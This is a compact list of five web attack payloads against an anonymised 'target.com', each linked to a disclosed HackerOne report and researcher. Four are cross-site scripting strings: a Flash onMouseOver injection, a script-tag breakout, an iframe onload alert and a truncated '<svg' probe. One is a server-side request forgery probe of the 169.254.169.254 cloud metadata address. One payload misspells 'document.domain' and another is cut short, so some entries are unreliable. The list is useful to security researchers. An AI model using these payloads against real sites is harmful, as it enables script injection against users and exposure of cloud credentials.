# target.com

5 payloads.

### `5c14f17f`

```
http://target.com/swf/photo_uploader_lite.swf?h=h?&onMouseOver=document.write(window.location.hash.substr(1))#<script>alert(document.domain)</script>
```

**Parameter:** `onMouseOver`
— [XSS at http://target.com on IE using flash files](https://hackerone.com/reports/66121) · target.com · [tunnelshade](https://hackerone.com/tunnelshade) · $500.0

### `49290d22`

```
http://target.com/search/dev?q=<svg
```

**Parameter:** `q`
— [cross siite scripting in the blog ](https://hackerone.com/reports/77904) · target.com · [cyberboy](https://hackerone.com/cyberboy)

### `29695ac4`

```
http://169.254.169.254/meta-data
```

— [SSRF on testing endpoint](https://hackerone.com/reports/128685) · target.com · [agarri_fr](https://hackerone.com/agarri_fr)

### `4fc94313`

```
lll"></script><script>alert('xss');</script>
```

— [Stored xss in shop name @ target.com](https://hackerone.com/reports/329862) · target.com · [sandeep_hodkasia](https://hackerone.com/sandeep_hodkasia)

### `1f683d81`

```
<iframe onload=alert(document.domail)>
```

— [Stored Xss On "https://target.com/"](https://hackerone.com/reports/1901706) · target.com · [vidaamuyarchi](https://hackerone.com/vidaamuyarchi)
